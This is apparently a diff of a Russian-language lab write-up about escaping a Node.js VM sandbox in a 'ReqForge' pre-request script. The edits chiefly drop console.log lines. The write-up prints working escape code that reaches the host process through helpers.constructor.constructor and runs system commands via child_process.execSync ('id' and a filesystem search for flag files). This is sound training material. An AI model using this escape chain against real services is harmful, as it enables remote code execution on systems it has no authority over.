@@ -66,7 +66,9 @@ outside = helpers.constructor.constructor('return this')()
 ## 4. Перехват и первичный тест
 
 Для проверки гипотезы в **Pre-request Script** был отправлен запрос. Скрипт пытается выбраться из песочницы через объект `helpers`, получить доступ к глобальному объекту `process` и выполнить системную команду `id`.
+
 ![первичный тест](https://github.com/koo-noo/my-write-up/blob/main/labs/labs.hackadvisor/Lab%20129%20%E2%80%94%20ReqForge%20%E2%80%94%20RCE%20via%20VM%20Sandbox%20Escape/images/%D0%BE%D1%82%D1%87%D0%B5%D1%82_5.JPG)
+
 **Разбор скрипта по частям:**
 
 1. `helpers` — это объект, который был передан в песочницу извне (из основного процесса Node.js). Именно из-за того, что он создан *снаружи*, у него сохраняется ссылка на внешнюю цепочку прототипов.
@@ -77,11 +79,12 @@ outside = helpers.constructor.constructor('return this')()
 6. `outside.process` — получаем доступ к объекту `process` реального Node.js-процесса.
 7. `.mainModule.require('child_process')` — через `require` главного модуля подгружаем встроенный системный модуль `child_process`, который позволяет запускать команды ОС.
 8. `.execSync('id')` — синхронно выполняет системную команду `id`.
-9. `.toString()` и `console.log(...)` — преобразуют вывод команды в строку и выводят её в лог (Script Output).
+9. `.toString()` — преобразуют вывод команды в строку.
 
 Ответ сервера
 
 ![ответ](https://github.com/koo-noo/my-write-up/blob/main/labs/labs.hackadvisor/Lab%20129%20%E2%80%94%20ReqForge%20%E2%80%94%20RCE%20via%20VM%20Sandbox%20Escape/images/%D0%BE%D1%82%D1%87%D0%B5%D1%82_6.JPG)
+
 ### Догадка о векторе атаки подтверждена: песочница пробита.
 
 ---
@@ -94,18 +97,18 @@ outside = helpers.constructor.constructor('return this')()
 Так как точный путь к флагу заранее неизвестен, первым делом выполним команду `find`, чтобы найти файлы, в названии которых есть слово `flag`. Для этого снова используем уже известный вектор побега и передаем в `execSync` команду поиска:
 
 ![путь до флага](https://github.com/koo-noo/my-write-up/blob/main/labs/labs.hackadvisor/Lab%20129%20%E2%80%94%20ReqForge%20%E2%80%94%20RCE%20via%20VM%20Sandbox%20Escape/images/%D0%BE%D1%82%D1%87%D0%B5%D1%82_7.JPG)
+
 ```javascript
 outside = helpers.constructor.constructor('return this')()
 const findResult = outside.process.mainModule.require('child_process')
     .execSync('find / -iname "*flag*" 2>/dev/null').toString()
-console.log(findResult)
 ```
 
 **Разбор эксплоита:**
 - Первая строка — это уже отработанная цепочка `helpers.constructor.constructor('return this')()`, которая даёт нам внешний глобальный объект.
 - `outside.process.mainModule.require('child_process')` — подгружает модуль для запуска команд.
 - `.execSync('find / -iname "*flag*" 2>/dev/null')` — запускает утилиту `find`, которая рекурсивно обходит всю файловую систему `/`, ищет файлы, содержащие `flag` в имени (без учета регистра), а `2>/dev/null` скрывает ошибки доступа к системным директориям, чтобы лог не засорялся.
-- `.toString()` и `console.log(...)` — выводим результат поиска в панель Script Output.
+- `.toString()` — преобразуют вывод команды в строку.
 
 В логах среди системных файлов мы видим искомый файл:
 `/root/flag.txt`
